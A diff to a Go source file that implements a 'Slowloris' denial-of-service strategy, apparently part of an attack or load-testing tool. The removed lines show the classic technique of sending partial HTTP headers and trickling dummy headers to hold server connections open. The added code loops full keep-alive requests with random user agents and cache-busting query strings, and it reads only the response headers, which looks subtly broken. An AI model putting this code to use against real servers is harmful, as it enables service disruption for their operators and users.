@@ -1,6 +1,7 @@
 package strategy
 
 import (
+	"bufio"
 	"context"
 	"crypto/tls"
 	"fmt"
@@ -80,32 +81,17 @@ func (s *Slowloris) Execute(ctx context.Context, target Target) error {
 	atomic.AddInt64(&s.activeConnections, 1)
 	defer atomic.AddInt64(&s.activeConnections, -1)
 
-	userAgent := s.userAgents[rand.Intn(len(s.userAgents))]
 	path := parsedURL.Path
 	if path == "" {
 		path = "/"
 	}
 
-	initialHeaders := []string{
-		fmt.Sprintf("GET %s HTTP/1.1\r\n", path),
-		fmt.Sprintf("Host: %s\r\n", parsedURL.Host),
-		fmt.Sprintf("User-Agent: %s\r\n", userAgent),
-		"Accept-language: en-US,en;q=0.9\r\n",
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
-		"Connection: keep-alive\r\n",
+	if err := s.sendCompleteRequest(conn, parsedURL.Host, path); err != nil {
+		return err
 	}
 
-	for _, header := range initialHeaders {
-		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
-		if _, err := conn.Write([]byte(header)); err != nil {
-			return fmt.Errorf("failed to write initial header: %w", err)
-		}
-	}
-
-	// Complete the HTTP request so the server responds before we enter the keep-alive loop.
-	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
-	if _, err := conn.Write([]byte("\r\n")); err != nil {
-		return fmt.Errorf("failed to terminate headers: %w", err)
+	if err := s.drainResponse(conn); err != nil {
+		return err
 	}
 
 	ticker := time.NewTicker(s.keepAliveInterval)
@@ -116,16 +102,69 @@ func (s *Slowloris) Execute(ctx context.Context, target Target) error {
 		case <-sessionCtx.Done():
 			return nil
 		case <-ticker.C:
-			dummyHeader := fmt.Sprintf("X-Keep-Alive-%d: %d\r\n",
-				rand.Intn(100000),
-				time.Now().UnixNano())
+			if err := s.sendCompleteRequest(conn, parsedURL.Host, path); err != nil {
+				return fmt.Errorf("keep-alive request failed: %w", err)
+			}
 
-			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
-			if _, err := conn.Write([]byte(dummyHeader)); err != nil {
-				return fmt.Errorf("keep-alive failed: %w", err)
+			if err := s.drainResponse(conn); err != nil {
+				return fmt.Errorf("keep-alive response failed: %w", err)
 			}
 		}
 	}
+}
+
+func (s *Slowloris) sendCompleteRequest(conn net.Conn, host string, path string) error {
+	userAgent := s.userAgents[rand.Intn(len(s.userAgents))]
+	queryParam := rand.Intn(100000)
+
+	request := fmt.Sprintf(
+		"GET %s?r=%d HTTP/1.1\r\n"+
+			"Host: %s\r\n"+
+			"User-Agent: %s\r\n"+
+			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"+
+			"Accept-Language: en-US,en;q=0.5\r\n"+
+			"Accept-Encoding: gzip, deflate\r\n"+
+			"Connection: keep-alive\r\n"+
+			"\r\n",
+		path,
+		queryParam,
+		host,
+		userAgent,
+	)
+
+	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
+	if _, err := conn.Write([]byte(request)); err != nil {
+		return fmt.Errorf("failed to write request: %w", err)
+	}
+
+	return nil
+}
+
+func (s *Slowloris) drainResponse(conn net.Conn) error {
+	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
+	reader := bufio.NewReader(conn)
+
+	statusLine, err := reader.ReadString('\n')
+	if err != nil {
+		return fmt.Errorf("failed to read status line: %w", err)
+	}
+
+	if !strings.HasPrefix(statusLine, "HTTP/") {
+		return fmt.Errorf("invalid HTTP response: %s", statusLine)
+	}
+
+	for {
+		line, err := reader.ReadString('\n')
+		if err != nil {
+			return fmt.Errorf("failed to read header: %w", err)
+		}
+
+		if line == "\r\n" || line == "\n" {
+			break
+		}
+	}
+
+	return nil
 }
 
 func (s *Slowloris) Name() string {
